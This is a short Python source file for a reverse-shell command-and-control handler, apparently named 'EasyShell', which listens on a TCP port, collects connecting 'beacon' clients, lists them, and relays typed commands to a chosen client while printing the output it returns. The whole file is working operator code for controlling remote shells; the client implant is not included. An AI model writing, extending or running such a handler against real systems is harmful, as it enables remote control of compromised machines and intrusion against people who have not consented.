import socket
import threading
from prettytable import PrettyTable

client_list = list()
info_list = list()

server = socket.socket()
server.bind(("127.0.0.1",9999))
server.listen(5)


def input_func():
    while 1:
        command = str(input("EasyShell>"))
        try:
           if command.split(" ")[0].lower() == 'beacon':
                if command.split(" ")[1].lower() == 'list':
                    table = PrettyTable(["Id","IP","Port","Remark"])
                    number = 1
                    for  _ in info_list:
                        table.add_row([number,_[0][0],_[0][1],_[1]])
                        # print(number,_[0],":",_[1])
                        number += 1
                    print(table)
                    continue
                number_what = int(command.split(' ')[1]) -1
                while 1:
                    session_input = str(input(info_list[number_what][0][0] + ":" + str(info_list[number_what][0][1]) + ">"))
                    if session_input.replace(" ","") == '':
                        continue
                    if session_input.lower() == 'hide' or session_input.lower() == 'back':
                        break
                    if session_input.lower() == 'close' or session_input.lower() == 'exit':
                        client_list[number_what].send(b'exit')
                        client_list[number_what].close()
                        del client_list[number_what]
                        del info_list[number_what]
                        break
                    try:
                        client_list[number_what].send(session_input.encode())
                        recv_length = int(client_list[number_what].recv(1024).decode())
                        response = ""
                        for i in range(recv_length // 1024 + 1):
                            response += client_list[number_what].recv(1024).decode()
                        print(response)
                    except:
                        del client_list[number_what]
                        del info_list[number_what]
                    
        except:
            pass 

threading.Thread(target=input_func).start()
while 1:
    client,addr = server.accept()
    print("\n[*]Online",addr[0],addr[1])
    note = client.recv(1024).decode()
    client_list.append(client)
    info_list.append([addr,note])
    
